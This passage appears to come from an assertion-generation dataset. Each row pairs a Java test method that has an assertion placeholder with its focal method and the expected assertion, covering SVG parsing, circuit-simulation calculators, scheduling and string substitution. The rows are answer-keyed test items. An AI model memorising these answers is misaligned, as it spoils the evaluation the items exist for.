LengthParser.parseLength(dashOffset, viewport); shape.setStrokeDashOffset(offset); }  if (xmlNode.hasAttribute(STROKE_LINEJOIN)) { String lineJoin = xmlNode.getAttributeValue(STROKE_LINEJOIN); applyLineJoin(shape, lineJoin); }  if (xmlNode.hasAttribute(STROKE_LINECAP)) { String lineCap = xmlNode.getAttributeValue(STROKE_LINECAP); applyLineCap(shape, lineCap); }  if (xmlNode.hasAttribute(STROKE_MITERLIMIT)) { String miterLimit = xmlNode.getAttributeValue(STROKE_MITERLIMIT); applyMiterLimit(shape, miterLimit, viewport); } }  if (xmlNode.hasAttribute(CLASS)) { String styleClasses = xmlNode.getAttributeValue(CLASS); setStyleClass(node, styleClasses, context.svgStyle); }  if (xmlNode.hasAttribute(CLIP_PATH) && context.clippingFactory != null) { String content = xmlNode.getAttributeValue(CLIP_PATH); setClipPath(node, content, context.clippingFactory, viewport); }  if (xmlNode.hasAttribute(STYLE)) { FontWeight fontWeight = FontWeight.NORMAL; FontPosture fontPosture = FontPosture.REGULAR; double fontSize = 12d; String fontFamily = null; String styles = xmlNode.getAttributeValue(STYLE); StringTokenizer tokenizer = new StringTokenizer(styles, "";""); while (tokenizer.hasMoreTokens()) { String style = tokenizer.nextToken();  StringTokenizer tokenizer2 = new StringTokenizer(style, "":""); String styleName = tokenizer2.nextToken().trim(); String styleValue = null; if (tokenizer2.hasMoreTokens()) { styleValue = tokenizer2.nextToken().trim(); } if (styleValue == null) { continue; }  switch (styleName) { case CLIP_PATH: setClipPath(node, styleValue, context.clippingFactory, viewport); break; case FONT_FAMILY: if (node instanceof Text) { fontFamily = styleValue.replace(""'"", """"); } break; case FONT_WEIGHT: if (node instanceof Text) { fontWeight = SVGShapeBuilder.getFontWeight(styleValue); } break; case TEXT_DECORATION: if (node instanceof Text) { SVGShapeBuilder.applyTextDecoration((Text) node, styleValue); } break; case FONT_STYLE: if (node instanceof Text) { fontPosture = SVGShapeBuilder.applyFontPosture((Text) node, styleValue); } break; case FONT_SIZE: if (node instanceof Text) { fontSize = ParserUtils.parseFontSize(styleValue); fontSize = viewport.scaleLength(fontSize); } break; case MARKER_START: { String id = ParserUtils.getURL(styleValue); if (markerContextR != null && context.hasMarker(id)) { MarkerSpec marker = context.getMarker(id); markerContextR.setMarkerStart(marker); } break; } case MARKER_MID: { String id = ParserUtils.getURL(styleValue); if (markerContextR != null && context.hasMarker(id)) { MarkerSpec marker = context.getMarker(id); markerContextR.setMarkerMid(marker); } break; } case MARKER_END: { String id = ParserUtils.getURL(styleValue); if (markerContextR != null && context.hasMarker(id)) { MarkerSpec marker = context.getMarker(id); markerContextR.setMarkerEnd(marker); } break; } case FILL: if (node instanceof Shape) { Paint fill = ParserUtils.expressPaint(contextNode, context.gradients, styleValue); ((Shape) node).setFill(fill); if (markerContextR != null) { markerContextR.setContextFill(fill); } } break; case STROKE: if (node instanceof Shape) { Paint stroke = ParserUtils.expressPaint(contextNode, context.gradients, styleValue); ((Shape) node).setStroke(stroke); if (markerContextR != null) { markerContextR.setContextStroke(stroke); } } break; case STROKE_WIDTH: if (node instanceof Shape) { double strokeWidth = LengthParser.parseLineWidth(styleValue, viewport); ((Shape) node).setStrokeWidth(strokeWidth); } break; case STROKE_DASHARRAY: if (node instanceof Shape) { applyDash(((Shape) node), styleValue, viewport); } break; case STROKE_DASHOFFSET: if (node instanceof Shape) { double offset = LengthParser.parseLength(styleValue, viewport); ((Shape) node).setStrokeDashOffset(offset); } break; case STROKE_LINECAP: if (node instanceof Shape) { applyLineCap(((Shape) node), styleValue); } break; case STROKE_MITERLIMIT: if (node instanceof Shape) { applyMiterLimit(((Shape) node), styleValue, viewport); } break; case STROKE_LINEJOIN: if (node instanceof Shape) { applyLineJoin(((Shape) node), styleValue); } break; case OPACITY: { double opacity = ParserUtils.parseOpacity(styleValue); if (opacity >= 0) { node.setOpacity(opacity); } break; } case FILL_OPACITY: { if (node instanceof Shape) { double fillOpacity = ParserUtils.parseOpacity(styleValue); if (fillOpacity >= 0) { ParserUtils.setFillOpacity(node, fillOpacity); } } break; } case TRANSFORM: { List<Transform> transformList = TransformUtils.extractTransforms(styleValue, viewport); if (!transformList.isEmpty()) { ObservableList<Transform> nodeTransforms = node.getTransforms(); Iterator<Transform> it = transformList.iterator(); while (it.hasNext()) { Transform theTransForm = it.next(); nodeTransforms.add(theTransForm); } } break; } case FILTER: { if (context.effectsSupported) { Effect effect = expressFilter(node, styleValue, context.filterSpecs); if (effect != null) { node.setEffect(effect); } } break; } default: break; } } if (node instanceof Text) { Font font = Font.font(fontFamily, fontWeight, fontPosture, fontSize); ((Text) node).setFont(font); } } return markerContextR; }  private static void applyMiterLimit(Shape shape, String styleValue, Viewport viewport) { try { double miterLimit = viewport.scaleLength(Double.parseDouble(styleValue)); shape.setStrokeMiterLimit(miterLimit); } catch (NumberFormatException e) { GlobalConfig.getInstance().handleParsingError(""MiterLimit "" + styleValue + "" is not a number""); } }  private static void applyLineCap(Shape shape, String styleValue) { StrokeLineCap linecap = StrokeLineCap.BUTT; if (styleValue.equals(ROUND)) { linecap = StrokeLineCap.ROUND; } else if (styleValue.equals(SQUARE)) { linecap = StrokeLineCap.SQUARE; } else if (!styleValue.equals(BUTT)) { linecap = StrokeLineCap.BUTT; } shape.setStrokeLineCap(linecap); }  private static void applyLineJoin(Shape shape, String styleValue) { StrokeLineJoin linejoin = StrokeLineJoin.MITER; if (styleValue.equals(BEVEL)) { linejoin = StrokeLineJoin.BEVEL; } else if (styleValue.equals(ROUND)) { linejoin = StrokeLineJoin.ROUND; } else if (!styleValue.equals(MITER)) { linejoin = StrokeLineJoin.MITER; } shape.setStrokeLineJoin(linejoin); }  private static void applyDash(Shape shape, String styleValue, Viewport viewport) { ObservableList<Double> array = shape.getStrokeDashArray(); List<Double> list = ParserUtils.parseDashArray(styleValue, viewport); if (list != null) { for (int i = 0; i < list.size(); i++) { array.add(list.get(i)); } } }  private static void setClipPath(Node node, String spec, ClippingFactory clippingFactory, Viewport viewport) { if (spec.startsWith(""url(#"")) { String clipID = ParserUtils.getURL(spec); if (clippingFactory.hasClip(clipID)) { Shape clipShape = clippingFactory.createClip(clipID, node, viewport); if (clipShape != null) { node.setClip(clipShape); } } } }  private static void setStyleClass(Node node, String styleClasses, Styles svgStyle) { StringTokenizer tok = new StringTokenizer(styleClasses, "" ""); while (tok.hasMoreTokens()) { String styleClass = tok.nextToken(); node.getStyleClass().add(styleClass); if (svgStyle != null && svgStyle.hasRule(styleClass)) { Styles.Rule rule = svgStyle.getRule(styleClass); rule.apply(node); } } }  private static Effect expressFilter(Node node, String value, Map<String, FilterSpec> filterSpecs) { Effect effect = ParserUtils.expressFilter(filterSpecs, node, value); return effect; } }"	"assertNotNull(""Styles must not be null"", styles)"
"testSetConst() { _constCalc.setConst(CONST_TEST); ""<AssertPlaceHolder>""; }
setConst(final double constValue) { // since this calculator is ""not calculatable), yout will never be executed. Therefore, // when setting the const value, the output has to be updated immediately! _outputSignal[0][0] = constValue; }"	assertEquals(CONST_TEST, _constCalc._outputSignal[0][0], ERROR_THRESHOLD)
"testInputTrueTrue() { _controlCalculatableTwoInputs._inputSignal[1][0] = 1; // reset; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[1][0] = 0; _controlCalculatableTwoInputs._inputSignal[0][0] = 0; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[0][0] = 1; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[0][0] = 0; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[0][0] = 1; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); ""<AssertPlaceHolder>""; }
berechneYOUT(final double deltaT) { if ((_inputSignal[0][0] >= SIGNAL_THRESHOLD) && (_lastValue < SIGNAL_THRESHOLD)) { _outputSignal[0][0]++; } if (_inputSignal[1][0] > SIGNAL_THRESHOLD) { _outputSignal[0][0] = 0;  // Logik-Schwelle --> 0.5;  RESET bei Input '1' (somit braucht man // den Anschluss nicht extra mit einem const=1 - Block belegen, damit der Counter laeuft) } _lastValue = _inputSignal[0][0];  }"	assertEquals(2, _controlCalculatableTwoInputs._outputSignal[0][0], 1e-6)
"testInputTrueFalse() { _controlCalculatableTwoInputs._inputSignal[0][0] = 1; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[0][0] = 0; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[0][0] = 1; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[1][0] = 1; // reset; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); ""<AssertPlaceHolder>""; }
berechneYOUT(final double deltaT) { if ((_inputSignal[0][0] >= SIGNAL_THRESHOLD) && (_lastValue < SIGNAL_THRESHOLD)) { _outputSignal[0][0]++; } if (_inputSignal[1][0] > SIGNAL_THRESHOLD) { _outputSignal[0][0] = 0;  // Logik-Schwelle --> 0.5;  RESET bei Input '1' (somit braucht man // den Anschluss nicht extra mit einem const=1 - Block belegen, damit der Counter laeuft) } _lastValue = _inputSignal[0][0];  }"	assertEquals(0, _controlCalculatableTwoInputs._outputSignal[0][0], 1e-6)
"testInputFalseFalse() { _controlCalculatableTwoInputs._inputSignal[0][0] = 1; _controlCalculatableTwoInputs._inputSignal[1][0] = 1; // reset; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs._inputSignal[1][0] = 0; // reset; _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); _controlCalculatableTwoInputs.berechneYOUT(TEST_DT); // counter should // count only ""flanks"" ""<AssertPlaceHolder>""; }
berechneYOUT(final double deltaT) { if ((_inputSignal[0][0] >= SIGNAL_THRESHOLD) && (_lastValue < SIGNAL_THRESHOLD)) { _outputSignal[0][0]++; } if (_inputSignal[1][0] > SIGNAL_THRESHOLD) { _outputSignal[0][0] = 0;  // Logik-Schwelle --> 0.5;  RESET bei Input '1' (somit braucht man // den Anschluss nicht extra mit einem const=1 - Block belegen, damit der Counter laeuft) } _lastValue = _inputSignal[0][0];  }"	assertEquals(0, _controlCalculatableTwoInputs._outputSignal[0][0], 1e-6)
"testSetDelayTime() { double newDelayTime = 0.6; _delCalculator.initializeAtSimulationStart(newDelayTime);  for (int i = 0; i < 11; i++) { _delCalculator._inputSignal[0][0] = 10 - i;  if(i == 5) { // setting the delay during the simulation should NOT change the result, since // the delay must be given at the simulation start! _delCalculator.setDelayTime(4); }  _delCalculator.berechneYOUT(1); } ""<AssertPlaceHolder>"";  }
berechneYOUT(final double deltaT) { if (_speicherLeer) {  // Speicher initial auffuellen if (deltaT > _delayTime) { // minimal delay, just feed the input signal to the output! _outputSignal[0][0] = _inputSignal[0][0]; return; } _outputSignal[0][0] = 0; _youtVerzoegert[_zeigerYOUT] = _inputSignal[0][0]; _zeigerYOUT++; if (_zeigerYOUT == _youtVerzoegert.length) { _speicherLeer = false; _zeigerYOUT = 0; }  } else { _outputSignal[0][0] = _youtVerzoegert[_zeigerYOUT]; _youtVerzoegert[_zeigerYOUT] = _inputSignal[0][0];  // laufendes Nachfuellen des Speichers _zeigerYOUT++; _zeigerYOUT %= _youtVerzoegert.length; // Zeiger laeuft 'im Kreis', damit wird verhindert, dass die // Daten im Speicher bei jedem Zeitschritt geshiftet werden muessen } }"	assertEquals(6, _delCalculator._outputSignal[0][0], 1e-20)
"testBerechneYOUT() { Random rand = new Random();  for(int i = 0; i < _demux._outputSignal.length; i++) { _demux._inputSignal[0][i] = rand.nextDouble(); }  _demux.berechneYOUT(1);  for(int i = 0; i < _demux._outputSignal.length; i++) { ""<AssertPlaceHolder>""; } }
berechneYOUT(final double deltaT) { for (int i = 0; i < _outputSignal.length; i++) { _outputSignal[i][0] = _inputSignal[0][i];  // Signal-Quelle } }"	assertEquals(_demux._inputSignal[0][i], _demux._outputSignal[i][0], 1e-9)
"testForwardInverse() {  DQABCDCalculator dqABC = new DQABCDCalculator(); ABCDQCalculator ABCdq = new ABCDQCalculator(); double[] theta = new double[1];  double[] a = dqABC._outputSignal[0]; double[] b = dqABC._outputSignal[1]; double[] c = dqABC._outputSignal[2];  ABCdq._inputSignal[0] = a; ABCdq._inputSignal[1] = b; ABCdq._inputSignal[2] = c; ABCdq._inputSignal[3] = theta; for (int iterator = 0; iterator < 5; iterator++) { for (int i = 0; i < 3; i++) { dqABC._inputSignal[i] = new double[1]; } dqABC._inputSignal[2] = theta;  Random random = new Random(); for (int j = 0; j < 3; j++) { // set some random input! dqABC._inputSignal[j][0] = random.nextDouble(); }  dqABC.berechneYOUT(1e-8); ABCdq.berechneYOUT(1e-8); // compare the output with input. should be identical, since // the functions are inverse to each other! for (int j = 0; j < 2; j++) { ""<AssertPlaceHolder>""; } } }
berechneYOUT(final double deltaT) { final double dVal = _inputSignal[0][0]; final double qVal = _inputSignal[1][0]; final double theta = _inputSignal[2][0]; final double aVal = dVal * Math.cos(theta) - qVal * Math.sin(theta); final double cVal = dVal * Math.cos(theta + TWO_PI_THIRD) - qVal * Math.sin(theta + TWO_PI_THIRD); final double bVal = -(aVal + cVal); _outputSignal[0][0] = aVal; _outputSignal[1][0] = bVal; _outputSignal[2][0] = cVal; }"	assertEquals(dqABC._inputSignal[j][0], ABCdq._outputSignal[j][0], 1e-8)
"testReset() { integrator._inputSignal[1][0] = 1; // set reset signal  integrator.initializeAtSimulationStart(dt);  for(double time = 0; time < Math.PI; time+= dt) { if(time > Math.PI/2) { integrator._inputSignal[1][0] = 0; // now, do normal integration! } integrator._inputSignal[0][0] = -Math.sin(time); integrator.berechneYOUT(dt); } // the integral of a negateive half wave sine is -2! ""<AssertPlaceHolder>""; }
berechneYOUT(final double deltaT) { if (_inputSignal[1][0] < 1) {   // normaler Betrieb - Integration  _y11 = _y1old + _a1Val * deltaT * (_inputSignal[0][0] + _xold) / 2.0; if (_y11 <= _min) { _y11 = _min; } if (_y11 >= _max) { _y11 = _max; } _outputSignal[0][0] = _y11; _xold = _inputSignal[0][0]; _y1old = _y11; } else {// reset: alles auf Null bzw. Init _xold = 0; _y1old = _y0Val; _outputSignal[0][0] = _y0Val; } }"	assertEquals(-1, integrator._outputSignal[0][0], 1e-5)
"testSetA1Val() { integrator.setA1Val(-2); integrator.initializeAtSimulationStart(dt);  for(double time = 0; time < Math.PI; time+= dt) { integrator._inputSignal[0][0] = -Math.sin(time); integrator.berechneYOUT(dt); } // the integral of a negateive half wave sine is -2! ""<AssertPlaceHolder>""; }
berechneYOUT(final double deltaT) { if (_inputSignal[1][0] < 1) {   // normaler Betrieb - Integration  _y11 = _y1old + _a1Val * deltaT * (_inputSignal[0][0] + _xold) / 2.0; if (_y11 <= _min) { _y11 = _min; } if (_y11 >= _max) { _y11 = _max; } _outputSignal[0][0] = _y11; _xold = _inputSignal[0][0]; _y1old = _y11; } else {// reset: alles auf Null bzw. Init _xold = 0; _y1old = _y0Val; _outputSignal[0][0] = _y0Val; } }"	assertEquals(4, integrator._outputSignal[0][0], 1e-5)
"testInitialValue() { double initValue = -10; integrator = new IntegratorCalculation(1, initValue, -1000, 1000); integrator._inputSignal[0] = new double[]{0}; integrator._inputSignal[1] = new double[]{0};  integrator.initializeAtSimulationStart(dt);  for(double time = 0; time < Math.PI; time+= dt) { integrator._inputSignal[0][0] = -Math.sin(time); integrator.berechneYOUT(dt); } // the integral of a negateive half wave sine is -2! ""<AssertPlaceHolder>""; }
berechneYOUT(final double deltaT) { if (_inputSignal[1][0] < 1) {   // normaler Betrieb - Integration  _y11 = _y1old + _a1Val * deltaT * (_inputSignal[0][0] + _xold) / 2.0; if (_y11 <= _min) { _y11 = _min; } if (_y11 >= _max) { _y11 = _max; } _outputSignal[0][0] = _y11; _xold = _inputSignal[0][0]; _y1old = _y11; } else {// reset: alles auf Null bzw. Init _xold = 0; _y1old = _y0Val; _outputSignal[0][0] = _y0Val; } }"	assertEquals(-12, integrator._outputSignal[0][0], 1e-5)
"testBerechneYOUT() { // use 2*sin(5 * time) as input signal // the result should be 10 * cos(time) (differentiation) for(double time = 0; time < END_TIME; time+= DELTA_T) { final double value = 2 * Math.sin(5 * time); _pdCalculator._inputSignal[0][0] = value; _pdCalculator.berechneYOUT(DELTA_T); final double result = _pdCalculator._outputSignal[0][0]; final double expected = 10 * Math.cos(5 * time);  if(time > 0) { // the first value is nonsense...! ""<AssertPlaceHolder>""; } }  }
berechneYOUT(final double deltaT) { // vereinfachte Formel ohne yalt --> wird numerisch viel robuster _outputSignal[0][0] = _gain / deltaT * (_inputSignal[0][0] - _oldValue); _oldValue = _inputSignal[0][0]; }"	assertEquals(expected, result, ACCURACY)
"testSetGain() { _pdCalculator.setGain(-2); // use -2 * 2*sin(5 * time) as input signal // the result should be -2 * 10 * cos(time) (differentiation) for(double time = 0; time < END_TIME; time+= DELTA_T) { double value = 2 * Math.sin(5 * time); _pdCalculator._inputSignal[0][0] = value; _pdCalculator.berechneYOUT(DELTA_T); double result = _pdCalculator._outputSignal[0][0]; double expected = -20 * Math.cos(5 * time);  if(time > 0) { // the first value is nonsense...! ""<AssertPlaceHolder>""; } } }
berechneYOUT(final double deltaT) { // vereinfachte Formel ohne yalt --> wird numerisch viel robuster _outputSignal[0][0] = _gain / deltaT * (_inputSignal[0][0] - _oldValue); _oldValue = _inputSignal[0][0]; }"	assertEquals(expected, result, ACCURACY)
"testBerechneYOUT() { _calculator._inputSignal[0][0] = 1; for(double time = 0; time < END_TIME; time+= DELTA_T) { _calculator.berechneYOUT(DELTA_T); final double result = _calculator._outputSignal[0][0]; final double expected = 1 - (Math.exp(-time - DELTA_T/2)); // f(x) = 1 - exp(-x)  if(time > DELTA_T) { // the first value is nonsense! ""<AssertPlaceHolder>""; } }  }
berechneYOUT(final double deltaT) { //if (t==0) { xalt=yaltInit;  yalt=xaltInit; }  // re-init _outputSignal[0][0] = _yOld * (2 * _TVal - deltaT) / (2 * _TVal + deltaT) + _a1Val / (1 + 2 * _TVal / deltaT) * (_inputSignal[0][0] + _xOld); _xOld = _inputSignal[0][0]; _yOld = _outputSignal[0][0]; }"	assertEquals(expected, result, 1e-6)
"testSetTimeConstant() { _calculator._inputSignal[0][0] = 1; final double timeConstant = 2; _calculator.setTimeConstant(timeConstant);  for(double time = 0; time < END_TIME; time+= DELTA_T) { _calculator.berechneYOUT(DELTA_T); final double result = _calculator._outputSignal[0][0]; final double expected = 1 - (Math.exp(-time/timeConstant - DELTA_T/2)); // f(x) = 1 - exp(-x / c) if(time > END_TIME / 2) { // the first value is nonsense! ""<AssertPlaceHolder>""; } } }
berechneYOUT(final double deltaT) { //if (t==0) { xalt=yaltInit;  yalt=xaltInit; }  // re-init _outputSignal[0][0] = _yOld * (2 * _TVal - deltaT) / (2 * _TVal + deltaT) + _a1Val / (1 + 2 * _TVal / deltaT) * (_inputSignal[0][0] + _xOld); _xOld = _inputSignal[0][0]; _yOld = _outputSignal[0][0]; }"	assertEquals(expected, result, 1e-4)
"testSetGain() { final double newGain = -2; _calculator.setGain(newGain); _calculator._inputSignal[0][0] = 1; for(double time = 0; time < END_TIME; time+= DELTA_T) { _calculator.berechneYOUT(DELTA_T); final double result = _calculator._outputSignal[0][0]; final double expected = newGain * (1 - (Math.exp(-time - DELTA_T/2))); // f(x) = 1 - exp(-x)  if(time > DELTA_T) { // the first value is nonsense! ""<AssertPlaceHolder>""; } } }
berechneYOUT(final double deltaT) { //if (t==0) { xalt=yaltInit;  yalt=xaltInit; }  // re-init _outputSignal[0][0] = _yOld * (2 * _TVal - deltaT) / (2 * _TVal + deltaT) + _a1Val / (1 + 2 * _TVal / deltaT) * (_inputSignal[0][0] + _xOld); _xOld = _inputSignal[0][0]; _yOld = _outputSignal[0][0]; }"	assertEquals(expected, result, 1e-7)
"testBerechneYOUT() { _calculator._inputSignal[0][0] = 1; for(double time = 0; time < END_TIME; time+= DELTA_T) { _calculator.berechneYOUT(DELTA_T); final double result = _calculator._outputSignal[0][0]; final double expected = 1 - Math.cos(time); if(time > END_TIME/2) { // the first value is nonsense! ""<AssertPlaceHolder>""; } } }
berechneYOUT(final double deltaT) { //        if (t==0) { xalt=0;  yalt=0;  yaltalt=0;  zalt=0; }  // re-init // //double yout= yalt*((4*T/dt*T/dt-1)/(4*T/dt*T/dt+1)) +a1/(1+4*T/dt*T/dt)*(xIN[0]+xalt) +zalt; //double z= -zalt +2*T/dt*(yout-yalt); final double dt_dt_T_T = deltaT * deltaT / (_TVal * _TVal); final double yout = _yalt * (2 - dt_dt_T_T) - _yaltalt + _a1Val * dt_dt_T_T * _xalt; _xalt = _inputSignal[0][0]; _yaltalt = _yalt; _yalt = yout; //zalt= z; _outputSignal[0][0] = yout;  }"	assertEquals(expected, result, 1e-4)
"testSetTimeConstant() { final double newTimeConstant = 0.5; _calculator.setTimeConstant(newTimeConstant); _calculator._inputSignal[0][0] = 1; for(double time = 0; time < END_TIME; time+= DELTA_T) { _calculator.berechneYOUT(DELTA_T); final double result = _calculator._outputSignal[0][0]; final double expected = 1 - Math.cos(time / newTimeConstant); if(time > END_TIME/2) { // the first value is nonsense! ""<AssertPlaceHolder>""; } }  }
berechneYOUT(final double deltaT) { //        if (t==0) { xalt=0;  yalt=0;  yaltalt=0;  zalt=0; }  // re-init // //double yout= yalt*((4*T/dt*T/dt-1)/(4*T/dt*T/dt+1)) +a1/(1+4*T/dt*T/dt)*(xIN[0]+xalt) +zalt; //double z= -zalt +2*T/dt*(yout-yalt); final double dt_dt_T_T = deltaT * deltaT / (_TVal * _TVal); final double yout = _yalt * (2 - dt_dt_T_T) - _yaltalt + _a1Val * dt_dt_T_T * _xalt; _xalt = _inputSignal[0][0]; _yaltalt = _yalt; _yalt = yout; //zalt= z; _outputSignal[0][0] = yout;  }"	assertEquals(expected, result, 1e-3)
"testSetGain() { _calculator._inputSignal[0][0] = 1; final double newGain = -2; _calculator.setGain(newGain); for(double time = 0; time < END_TIME; time+= DELTA_T) { _calculator.berechneYOUT(DELTA_T); final double result = _calculator._outputSignal[0][0]; final double expected = newGain * (1 - Math.cos(time)); if(time > END_TIME/2) { // the first value is nonsense! ""<AssertPlaceHolder>""; } }  }
berechneYOUT(final double deltaT) { //        if (t==0) { xalt=0;  yalt=0;  yaltalt=0;  zalt=0; }  // re-init // //double yout= yalt*((4*T/dt*T/dt-1)/(4*T/dt*T/dt+1)) +a1/(1+4*T/dt*T/dt)*(xIN[0]+xalt) +zalt; //double z= -zalt +2*T/dt*(yout-yalt); final double dt_dt_T_T = deltaT * deltaT / (_TVal * _TVal); final double yout = _yalt * (2 - dt_dt_T_T) - _yaltalt + _a1Val * dt_dt_T_T * _xalt; _xalt = _inputSignal[0][0]; _yaltalt = _yalt; _yalt = yout; //zalt= z; _outputSignal[0][0] = yout;  }"	assertEquals(expected, result, 1e-4)
"testBerechneYOUT() {  double oldValue = -1; for(int i = 0; i < 200; i++) { _randomCalculator.berechneYOUT(1); double value = _randomCalculator._outputSignal[0][0]; // very basic test: the output should never stay constant... ""<AssertPlaceHolder>""; oldValue = value; } }
berechneYOUT(final double deltaT) { _randomVal += 1 - 2 * Math.random();  // [-1 .. +1] _outputSignal[0][0] = _randomVal; }"	assertTrue(value != oldValue)
"testBerechneYOUT() { for(double time = 0; time < END_TIME; time+= DELTA_T) { AbstractSignalCalculator.setTime(time); _signalCalc.berechneYOUT(DELTA_T); final double result = _signalCalc._outputSignal[0][0]; final double expectedResult = AMPL * Math.sin(2 * Math.PI * time * FREQUENCY - PHASE) + DC_OFFSET; ""<AssertPlaceHolder>""; } }
berechneYOUT(final double deltaT) { _outputSignal[0][0] = _amplitudeAC * Math.sin(TWO_PI * _frequency * _time - _phase) + _anteilDC; }"	assertEquals(expectedResult, result, TOLERANCE)
"whenResumingAfterExternalChange_lightEmitsBrightnessAndWarmth() { MutuallyExclusiveChoice<LightConfiguration> oldConfiguration = fixture.configurationEditor.getLightConfigurationChoice();  fixture.lightTestFixture.simulateOnyxSliderChange(new WarmAndColdLedOutput(255, 255));  fixture.configurationEditor.getChooseCurrentLightConfigurationRequest$().onNext( oldConfiguration.getSelectedIndex()); fixture.lightTestFixture.captureLedOutputAndComplete();  BrightnessAndWarmthState state = fixture.lightTestFixture.getBrightnessAndWarmthState(); ""<AssertPlaceHolder>""; }
getLightConfigurationChoice();"	assertEquals(oldConfiguration.getSelected().brightnessAndWarmth, state.brightnessAndWarmth)
"canRemoveScheduledLightConfigurationChange() { ScheduleEntry scheduleEntry = new ScheduleEntry(LocalTime.parse(""15:00""), ScheduledLightState.onWithConfiguration(""Day"", 2)); fixture.lightScheduler.add(scheduleEntry); fixture.resetIntentMock(); fixture.lightScheduler.remove(LocalTime.parse(""15:00""));  ""<AssertPlaceHolder>"";  verify(fixture.alarmManagerMock).cancel(ArgumentCaptor.forClass(PendingIntent.class).capture()); }
remove(LocalTime time) { removeAlarm(time); removeFromStorage(time); }"	assertEquals( new Gson().toJson(scheduleEntry), fixture.intentMock.getStringExtra(LightScheduler.ScheduleEntryIntentKey) )
"testEnvironmentAndSystemSubstitution() { final Properties defaults = new Properties(); defaults.put(""a"", ""1""); defaults.put(""b"", ""2""); defaults.put(""c"", ""3"");  final Properties systems = new Properties(); systems.put(""a"", ""4""); systems.put(""b"", ""5""); systems.put(""c"", ""6"");  final Map<String, String> environments = new HashMap<>(); environments.put(""a"", ""7""); environments.put(""b"", ""8""); environments.put(""c"", ""9"");  final StringSubstitution substitution = new StringSubstitution(defaults, systems, environments); final Map<String, String> mapping = new LinkedHashMap<>();  mapping.put(""${a} ${sys:a} ${env:a}"", ""1 4 7""); mapping.put(""${missing:-${b}} ${missing:-${sys:b}} ${missing:-${env:b}}"", ""2 5 8""); mapping.put(""${sys:missing:-${b}} ${sys:missing:-${sys:b}} ${sys:missing:-${env:b}}"", ""2 5 8""); mapping.put(""${env:missing:-${b}} ${env:missing:-${sys:b}} ${env:missing:-${env:b}}"", ""2 5 8"");  for (final Map.Entry<String, String> entry : mapping.entrySet()) { final String text = entry.getKey(); final String expected = entry.getValue(); final String actual = substitution.substitute(text);  Assert.""<AssertPlaceHolder>""; } }
substitute(final String text) { final StringBuilder builder = new StringBuilder();  for (int index = 0; index < text.length(); ) { final int position = text.indexOf(""${"", index);  if (position < 0) { builder.append(text, index, text.length()); break; }  builder.append(text, index, position); index = substitute(text, position, builder); }  return builder.toString(); }  private int substitute(final String source, int index, final StringBuilder target) { final int end = source.length(); final int start = index;  index += 2;  while (index < end) { char c = source.charAt(index);  if (c == '}') { final String key = source.substring(start + 2, index); final String value = lookup(key);  if (value == null) { target.append(""${"").append(key).append("":#UNRESOLVED#"").append(""}""); } else { target.append(value); }  return index + 1; }  if (c == ':' && index + 1 < end && source.charAt(index + 1) == '-') { final String key = source.substring(start + 2, index); final String value = lookup(key);  final int length = target.length(); final int mid = index + 2;  index = mid;  while (index < end) { c = source.charAt(index);  if (c == '}') { if (value != null) { target.setLength(length); target.append(value); }  return index + 1; }  if (c == '$' && index + 1 < end && source.charAt(index + 1) == '{') { index = substitute(source, index, target); continue; }  target.append(c); index++; }  target.insert(length, source, start, mid); return end; }  index++; }  target.append(source, start, end); return index; }"	assertEquals(expected, actual)
"calcDistanceTest() { Point p1 = factory.createPoint(new Coordinate(0, 0)); Point p2 = factory.createPoint(new Coordinate(3, 4)); Assert.""<AssertPlaceHolder>""; }
calcDistance(Geometry geom1, Geometry geom2) { Point p1 = geom1.getCentroid(), p2 = geom2.getCentroid(); double x1 = p1.getX(), y1 = p1.getY(); double x2 = p2.getX(), y2 = p2.getY(); return Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2)); }"	assertEquals(calculator.calcDistance(p1, p2), 5, 10e-6)
"rangeQueryPointTest() { TreeIndex<Point> treeIndex = new STRTreeIndex<>(); treeIndex.insert(points);  List<Point> result = treeIndex.query(new Envelope(110, 120, 30, 40)); ""<AssertPlaceHolder>""; }
size() { return rTree.size(); }"	assertEquals(2, result.size())
"rangeQueryPointTest() { TreeIndex<Point> treeIndex = new STRTreeIndex<>(); treeIndex.insert(points);  List<Point> result = treeIndex.query(new Envelope(110, 120, 30, 40)); ""<AssertPlaceHolder>""; }
size() { return stRtree.size(); }"	assertEquals(2, result.size())
"JSONException { final String siteKey = ""0000-1111-2222-3333""; final String locale = ""ro""; final HCaptchaOrientation orientation = HCaptchaOrientation.PORTRAIT; final HCaptchaSize size = HCaptchaSize.NORMAL; final String rqdata = ""custom rqdata""; final String jsSrc = ""127.0.0.1/api.js""; final String endpoint = ""https://example.com/endpoint""; final String assethost = ""https://example.com/assethost""; final String imghost = ""https://example.com/imghost""; final String reportapi = ""https://example.com/reportapi""; final String host = ""custom-host""; final long timeout = 60; final HCaptchaConfig config = HCaptchaConfig.builder() .siteKey(siteKey) .locale(locale) .size(size) .orientation(orientation) .theme(HCaptchaTheme.DARK) .rqdata(rqdata) .jsSrc(jsSrc) .endpoint(endpoint) .assethost(assethost) .imghost(imghost) .reportapi(reportapi) .host(host) .resetOnTimeout(true) .hideDialog(true) .tokenExpiration(timeout) .diagnosticLog(true) .disableHardwareAcceleration(false) .build(); final HCaptchaJSInterface jsInterface = new HCaptchaJSInterface(handler, config, captchaVerifier);  final JSONObject expected = new JSONObject(); expected.put(""siteKey"", siteKey); expected.put(""sentry"", true); expected.put(""loading"", true); expected.put(""rqdata"", rqdata); expected.put(""jsSrc"", jsSrc); expected.put(""endpoint"", endpoint); expected.put(""reportapi"", reportapi); expected.put(""assethost"", assethost); expected.put(""imghost"", imghost); expected.put(""locale"", 